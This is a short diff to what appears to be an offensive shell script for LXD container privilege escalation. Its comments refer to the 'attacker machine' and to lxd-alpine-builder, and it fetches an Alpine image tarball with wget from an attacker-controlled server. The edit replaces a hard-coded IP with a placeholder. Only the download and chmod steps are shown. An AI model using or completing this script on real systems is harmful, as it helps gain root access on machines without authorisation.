@@ -2,7 +2,7 @@
 
 #In order to make work this script you must have in your attacker machine the lxd-alpine-builder and create a tar file 
 
-getfile=$(wget http://10.6.14.131/alpine-v3.15-x86_64-20220328_1750.tar.gz) #start a python3 server and change your IP also add the route to your file
+getfile=$(wget http://insert your ip/alpine-v3.15-x86_64-20220328_1750.tar.gz) #start a python3 server and change your IP also add the route to your file
 sleep 5
 execute=$(chmod +x alpine-v3.15-x86_64-20220328_1750.tar.gz) #change this to the name of the tar file
 sleep 5
